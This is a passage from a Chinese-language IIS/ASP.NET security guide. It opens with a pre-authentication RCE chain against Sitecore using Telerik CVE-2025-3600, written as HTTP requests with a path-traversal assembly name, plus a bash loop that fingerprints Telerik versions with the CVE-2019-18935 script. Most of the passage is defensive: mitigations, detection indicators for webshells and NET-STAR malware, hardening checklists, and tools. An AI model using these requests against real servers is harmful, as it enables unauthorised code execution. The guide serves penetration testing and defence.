**预认证 RCE 链示例（Sitecore XP）：**

1. 预认证：触发构造器注册不安全 `AssemblyResolve` Handler 的类型
2. 通过认证或独立漏洞：将恶意 DLL 写入解析器探测的目录
3. 预认证：使用 CVE-2025-3600 配合不存在类型 + 路径遍历 assembly 名 → 解析器加载植入的 DLL → 作为 IIS 工作进程执行代码

```http
# 加载不安全解析器（许多设置中无需认证）
GET /-/xaml/Sitecore.Shell.Xaml.WebControl

# 通过 Telerik 不安全反射触发解析器
GET /Telerik.Web.UI.WebResource.axd?type=iec&dkey=1&prtype=watchTowr.poc,+../../../../../../../../../watchTowr
```

### 6.1.7 通过旧版 RAU Handler 进行版本判定

如果 `type=rau` 也可访问，使用经典 Telerik RAU 工具在进行 `type=iec` 研究前指纹识别 `Telerik.Web.UI.dll` 版本：

```bash
for YEAR in $(seq 2011 2025); do
  echo -n "$YEAR: "
  python3 CVE-2019-18935.py -t -v "$YEAR" -p /dev/null \
    -u 'https://target/Telerik.Web.UI.WebResource.axd?type=rau' 2>/dev/null |
    grep -oE "Telerik.Web.UI, Version=$YEAR\\.[0-9\\.]+" || echo
done
```

> **注意：**`type=rau` 不存在**不是决定性结论**。即使 `rau` 被禁用或过滤，`iec` 仍可能暴露。

### 6.1.8 缓解措施

- 升级 Telerik UI for ASP.NET AJAX 至 **2025.1.416** 或更高版本
- 通过 WAF/重写规则移除或限制 `Telerik.Web.UI.WebResource.axd` 的暴露
- 审计并加固自定义 `AppDomain.AssemblyResolve` Handler — 避免从 `args.Name` 构建路径而不做处理
- 限制上传/写入位置；防止 DLL 被放入解析器探测目录
- 监控不存在类型的加载尝试以捕获解析器滥用

> **完整分析：**
> - [Telerik KB — Unsafe Reflection Vulnerability（CVE-2025-3600）](https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/kb-security-unsafe-reflection-cve-2025-3600)
> - [watchTowr Labs — More than DoS: CVE-2025-3600](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
> - [watchTowr — Pre-Auth RCE Chain in Sitecore（CVE-2025-34509）](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)

---

# 0x07 防御、加固与检测

## 7.1 检测方法论

### 7.1.1 网络流量检测

| 指标 | 来源 | 意义 |
|------|------|------|
| 对 `trace.axd`、`Telerik.Web.UI.WebResource.axd` 的请求 | Web 服务器日志 | 已知存在漏洞的端点 |
| `type=iec` 和异常的 `prtype` 值 | 查询参数 | CVE-2025-3600 利用尝试 |
| URL 路径中的 `~*` | 请求路径 | 短文件名枚举 |
| 无 `Host` 头的 HTTP/1.0 请求 | 请求行 | 内部 IP 泄露探测 |
| URL 中的 `/:$i30:$INDEX_ALLOCATION/` | 请求路径 | IIS 7.5 Basic 认证绕过尝试 |
| `.config` 文件上传 | Content-Disposition | Web.config 代码执行尝试 |
| 类型加载失败 + `AppDomain.AssemblyResolve` 事件 | ETW / .NET 运行时 | Telerik 解析器滥用 |

### 7.1.2 主机端检测

| 指标 | 位置 | 意义 |
|------|------|------|
| `wwwroot` 中出现与部署时间线不符的新 `.aspx` 文件 | 文件系统 | Webshell 植入 |
| 包含大量 Base64/Gzip blob 的 ASPX 文件 | 文件内容分析 | NET-STAR 引导程序 |
| 来自异常调用栈的 `Assembly.Load(byte[])` | .NET Profiling / ETW | 反射加载 |
| 内存中出现 `Encrypt/Decrypt`（ECB 模式）、`Compress/Decompress`、`GetContext` 字符串 | `w3wp.exe` 内存字符串 | NET-STAR 操作者代码 |
| Cookie 值中重复的 `"STAR"` 分隔符 | 网络流量 / IIS 日志 | NET-STAR C2 通道 |
| ASPX 文件时间戳不匹配或为未来时间 | 文件系统元数据 | 时间戳伪造 |
| `w3wp.exe` 中无文件对应的托管模块 | WinDbg/SOS 中的 `!dumpdomain` | 纯内存程序集 |

## 7.2 IIS 加固检查表

### 7.2.1 配置加固

| 措施 | 理由 |
|------|------|
| 生产环境移除/锁定 `trace.axd`（`<trace enabled="false"/>`） | 防止详细请求日志暴露 |
| 移除默认/错误配置的 Handler 映射（`.cer`、`.cdx` → ASP） | 关闭遗留解析绕过 |
| 锁定 `Telerik.Web.UI.WebResource.axd` 或升级至 ≥2025.1.416 | 缓解 CVE-2025-3600 |
| 将 PHP FastCGI 的 `cgi.fix_pathinfo` 设为 0 | 防止 `/.php` 追加执行 |
| 确保 PHP 勾选 `Invoke handler only if request is mapped to` | 防止 CGI Handler 绕过 |
| 移除 IISADMPWD 虚拟目录（IIS 4.0/5.0 遗留） | 移除密码管理暴露面 |
| 如不需要，移除 FrontPage Server Extensions（`_vti_*`） | 移除遗留攻击面 |
| 如不需要，禁用 WebDAV | 关闭 IIS 6.0 WebDAV 解析漏洞和 PROPFIND/PROPPATCH 枚举 |
| 移除默认示例（`/iissamples/`、`/scripts/samples/`） | 移除已知存在漏洞的示例代码 |
| 设置 `<httpRuntime targetFramework="..." requestValidationMode="4.0"/>` | 在 ASP.NET 4.0+ 中启用请求验证 |

### 7.2.2 密钥管理

| 措施 | 理由 |
|------|------|
| 用生成的唯一密钥替换默认 `machineKey` 值 | 防止 ASPXAUTH 跨应用 Cookie 复用 |
| 将 Data Protection 密钥环存储在 webroot 之外（使用 `%PROGRAMDATA%` 或 Azure Key Vault） | 防止轻易离线解密 |
| 对敏感配置使用用户作用域 DPAPI 而非机器作用域 | 将解密范围限制在应用程序池身份 |
| 加密 `web.config` 中的 `connectionStrings` 和 `appSettings` 配置节 | 保护数据库凭据的静态存储 |

### 7.2.3 文件系统与应用程序池

| 措施 | 理由 |
|------|------|
| 确保低权限用户/组对 `C:\inetpub\wwwroot` 没有写权限 | 防止 ASPX webshell 植入 |
| 每个应用在专用应用程序池中运行，使用最小权限身份 | 限制应用间横向移动 |
| 从不需要的 AppPool 身份中移除 `SeImpersonatePrivilege` | 阻止 Potato 系列从 AppPool 提权到 SYSTEM |
| 使用 `ApplicationPoolIdentity`（虚拟账户）而非 `NetworkService` | 更严格的默认权限 |
| 启用 IIS 请求过滤 — 拒绝 `.config`、`.asax`、`.cs`、`.vb` 扩展名 | 防止敏感文件下载和 web.config 上传 |
| 设置 `maxAllowedContentLength` 和 `maxQueryString` 限制 | 缓解超大请求攻击 |

### 7.2.4 监控与响应

| 措施 | 理由 |
|------|------|
| 启用高级日志记录，包含完整 URI、查询字符串、Cookie 和 `Host` 头 | 对所有攻击向量的可见性 |
| 将 IIS 日志转发到 SIEM，对 §7.1 中的指标设置告警 | 实时检测 |
| 对 .NET AssemblyLoad 事件使用 ETW 跟踪 | 检测反射加载 |
| 启用 AppLocker / WDAC 限制从可写目录加载 DLL | 防止 Telerik 解析器滥用链 |
| 定期运行 `icacls C:\inetpub\wwwroot` 审计 | 检测权限漂移 |
| 保持 IIS 和 .NET 运行时补丁更新（Windows Update） | 处理 HTTP.sys 和框架级漏洞 |

## 7.3 工具清单

| 工具 | 用途 | 参考 |
|------|------|------|
| `iis_shortname_scanner.jar` | 波浪号短文件名枚举 | [github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) |
| Metasploit `iis_shortname_scanner` | 集成扫描 | `use scanner/http/iis_shortname_scanner` |
| `brainstorm/fuzzer_shortname.py` | 基于 LLM 的短文件名补全 | [github.com/Invicti-Security/brainstorm](https://github.com/Invicti-Security/brainstorm) |
| `iisfinal.txt` | IIS 目录/文件爆破字典 | Hacktricks 编译 |
| `icacls` / `cacls` | NTFS 权限审计 | Windows 内置 |
| `aspnet_regiis.exe` | 配置加密/解密 | .NET Framework SDK |
| `dnSpy` / `ILSpy` / `dotPeek` | .NET DLL 反编译 | 第三方 |
| CVE-2019-18935.py | Telerik RAU 版本爆破 | 遗留 Telerik PoC |
| WinDbg + SOS（`!dumpdomain`） | 内存中程序集枚举 | Windows SDK |

## 参考资料

- [HackTricks — IIS Internet Information Services](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)
- [Orange Tsai — CVE-2022-30209: Let's Dance in the Cache（2022）](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)
- [MindedSecurity — From Path Traversal to Source Code in .NET（2018）](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)
- [Soroush SecProject — Microsoft IIS Tilde Character Vulnerability（PDF）](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)
- [Soroush SecProject — Upload a Web.config File for Fun & Profit（2014）](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)
- [Unit 42 — Phantom Taurus: NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [watchTowr Labs — More than DoS: CVE-2025-3600（2025）](https://labs.watchtowr.com/more-than-dos-progress-telerik-ui-for-asp-net-ajax-unsafe-reflection-cve-2025-3600/)
- [watchTowr — Pre-Auth RCE Chain in Sitecore CVE-2025-34509（2025）](https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform/)
- [Telerik KB — Unsafe Reflection CVE-2025-3600](https://www.telerik.com/products/aspnet-ajax/documentation/knowledge-base/kb-security-unsafe-reflection-cve-2025-3600)
- [Rapid7 — ASP.NET Trace.AXD](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)
- [0xdf — HTB Job: IIS Write → ASPX Shell → GodPotato（2026）](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [PayloadsAllTheThings — IIS web.config Upload Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
- [Absolomb — Windows Privilege Escalation Guide（2018）](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [SecLists — IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)
